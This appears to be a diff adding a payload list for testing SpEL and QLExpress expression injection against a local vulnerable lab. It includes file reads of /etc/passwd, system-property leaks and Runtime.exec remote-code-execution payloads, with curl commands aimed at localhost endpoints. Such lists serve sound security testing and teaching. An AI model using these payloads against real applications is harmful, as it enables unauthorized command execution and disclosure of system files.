@@ -1,0 +1,176 @@
+# 表达式注入漏洞测试 Payload
+# Expression Injection Test Payloads
+
+## SpEL (Spring Expression Language) Payloads
+
+### 信息泄露 Payloads
+
+# 获取系统用户名
+T(java.lang.System).getProperty('user.name')
+
+# 获取操作系统名称
+T(java.lang.System).getProperty('os.name')
+
+# 获取 Java 版本
+T(java.lang.System).getProperty('java.version')
+
+# 获取用户主目录
+T(java.lang.System).getProperty('user.home')
+
+# 获取环境变量
+T(java.lang.System).getenv('PATH')
+
+### 文件操作 Payloads
+
+# 检测文件是否存在
+new java.io.File('/etc/passwd').exists()
+
+# 读取文件内容
+new java.io.BufferedReader(new java.io.FileReader('/etc/passwd')).readLine()
+
+# 列出目录内容
+new java.io.File('/tmp').list()
+
+### 命令执行 Payloads (RCE)
+
+# 执行 whoami 命令
+T(java.lang.Runtime).getRuntime().exec('whoami')
+
+# 执行 ls 命令
+T(java.lang.Runtime).getRuntime().exec('ls -la')
+
+# 执行 id 命令
+T(java.lang.Runtime).getRuntime().exec('id')
+
+# Windows 执行计算器
+T(java.lang.Runtime).getRuntime().exec('calc.exe')
+
+# 获取进程列表（Windows）
+T(java.lang.Runtime).getRuntime().exec('tasklist')
+
+### 带模板语法的 SpEL (用于 vuln2 端点)
+
+# 模板化 RCE
+#{T(java.lang.Runtime).getRuntime().exec('whoami')}
+
+# 模板化信息泄露
+#{T(java.lang.System).getProperty('user.name')}
+
+# 模板化计算
+#{1+1*2}
+
+# 模板化字符串操作
+#{'hello'.toUpperCase()}
+
+### 其他 Payloads
+
+# 数学计算
+1+1*2
+
+# 字符串拼接
+'hello' + ' ' + 'world'
+
+# 调用方法
+'hello'.toUpperCase()
+
+# 获取类加载器
+T(java.lang.ClassLoader).getSystemClassLoader()
+
+---
+
+## QLExpress Payloads
+
+### 信息泄露 Payloads
+
+# 获取系统用户名
+System.getProperty("user.name")
+
+# 获取操作系统名称
+System.getProperty("os.name")
+
+# 获取 Java 版本
+System.getProperty("java.version")
+
+# 获取用户主目录
+System.getProperty("user.home")
+
+### 命令执行 Payloads (RCE)
+
+# 执行 whoami 命令
+Runtime.getRuntime().exec("whoami")
+
+# 执行 ls 命令
+Runtime.getRuntime().exec("ls -la")
+
+# 执行 id 命令
+Runtime.getRuntime().exec("id")
+
+# Windows 执行计算器
+Runtime.getRuntime().exec("calc.exe")
+
+### 上下文变量操作 (用于 vuln2 端点)
+
+# 转换为大写
+name.toUpperCase()
+
+# 获取长度
+name.length()
+
+# 字符串拼接
+name + "_admin"
+
+### 其他 Payloads
+
+# 数学计算
+1+1*2
+
+# 布尔表达式
+true && false
+
+# 字符串操作
+"hello".toUpperCase()
+
+# 数组操作
+new int[]{1,2,3}.length
+
+---
+
+## 测试命令示例
+
+### SpEL 测试
+
+# 测试 vuln1 端点（直接解析）
+curl "http://localhost:8080/spel/vuln1?expression=T(java.lang.System).getProperty('user.name')"
+
+# 测试 vuln2 端点（模板解析）
+curl "http://localhost:8080/spel/vuln2?expression=#{T(java.lang.System).getProperty('user.name')}"
+
+# SpEL RCE 测试（如果环境允许）
+curl "http://localhost:8080/spel/vuln1?expression=T(java.lang.Runtime).getRuntime().exec('whoami')"
+
+# SpEL 文件检测测试
+curl "http://localhost:8080/spel/vuln1?expression=new java.io.File('/etc/passwd').exists()"
+
+### QLExpress 测试
+
+# 测试 vuln 端点
+curl "http://localhost:8080/qlexpress/vuln?expression=System.getProperty(\"user.name\")"
+
+# 测试 vuln2 端点（带上下文）
+curl "http://localhost:8080/qlexpress/vuln2?expression=name.toUpperCase()&name=test"
+
+# QLExpress RCE 测试（如果环境允许）
+curl "http://localhost:8080/qlexpress/vuln?expression=Runtime.getRuntime().exec(\"whoami\")"
+
+---
+
+## 注意事项
+
+1. 某些 RCE payload 可能因环境限制（如权限、安全策略）而无法成功执行
+2. 在测试环境中优先使用信息泄露 payload 验证漏洞存在性
+3. SpEL 的模板语法（#{...}）仅适用于 vuln2 端点
+4. URL 编码注意事项：
+   - 单引号 ' 需要编码为 %27
+   - 双引号 " 需要编码为 %22
+   - 空格 需要编码为 %20 或 +
+   - 花括号 { } 需要编码为 %7B %7D
